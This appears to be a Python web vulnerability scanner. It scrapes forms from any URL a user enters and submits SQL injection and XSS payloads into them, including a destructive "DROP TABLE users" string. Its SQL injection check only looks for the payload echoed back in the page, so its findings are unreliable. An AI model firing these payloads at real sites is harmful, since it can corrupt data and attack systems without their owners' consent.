import requests
from bs4 import BeautifulSoup
from urllib.parse import urljoin

# Payloads to test vulnerabilities
sql_payloads = ["' OR '1'='1", "'; DROP TABLE users; --"]
xss_payloads = ['<script>alert("XSS")</script>', '" onmouseover="alert(1)"']

headers = {
    "User-Agent": "WebVulnScanner/1.0"
}

def get_forms(url):
    try:
        soup = BeautifulSoup(requests.get(url, headers=headers, timeout=10).text, "html.parser")
        return soup.find_all("form")
    except Exception as e:
        print(f"[!] Error fetching forms: {e}")
        return []

def form_details(form):
    details = {}
    action = form.attrs.get("action", "").lower()
    method = form.attrs.get("method", "get").lower()
    inputs = []
    for input_tag in form.find_all("input"):
        name = input_tag.attrs.get("name")
        input_type = input_tag.attrs.get("type", "text")
        inputs.append({"name": name, "type": input_type})
    details["action"] = action
    details["method"] = method
    details["inputs"] = inputs
    return details

def submit_form(form_details, url, payload):
    target_url = urljoin(url, form_details["action"])
    data = {}
    for input in form_details["inputs"]:
        if input["type"] == "text" and input["name"]:
            data[input["name"]] = payload
        elif input["name"]:
            data[input["name"]] = "test"
    try:
        if form_details["method"] == "post":
            return requests.post(target_url, data=data, headers=headers, timeout=10)
        return requests.get(target_url, params=data, headers=headers, timeout=10)
    except Exception as e:
        print(f"[!] Error submitting form to {target_url}: {e}")
        return None

def scan_xss_and_sql(url):
    forms = get_forms(url)
    print("="*60)
    print(f"[+] Found {len(forms)} form(s) on {url}")
    print("="*60)
    
    for i, form in enumerate(forms, start=1):
        form_info = form_details(form)
        print(f"\n[*] Testing form #{i} ({form_info['method'].upper()} to {form_info['action']})")
        for payload in sql_payloads + xss_payloads:
            response = submit_form(form_info, url, payload)
            if response and payload in response.text:
                if payload in sql_payloads:
                    print(f"[!] SQL Injection vulnerability detected!")
                    print(f"    -> Payload: {payload}")
                elif payload in xss_payloads:
                    print(f"[!] XSS vulnerability detected!")
                    print(f"    -> Payload: {payload}")
                break  # Stop testing after first success
        else:
            print("[-] No vulnerability detected in this form.")

if __name__ == "__main__":
    target = input("\nEnter a URL to scan (e.g., http://testphp.vulnweb.com): ").strip()
    if not target.startswith("http"):
        print("[!] Please enter a valid URL starting with http:// or https://")
    else:
        scan_xss_and_sql(target)
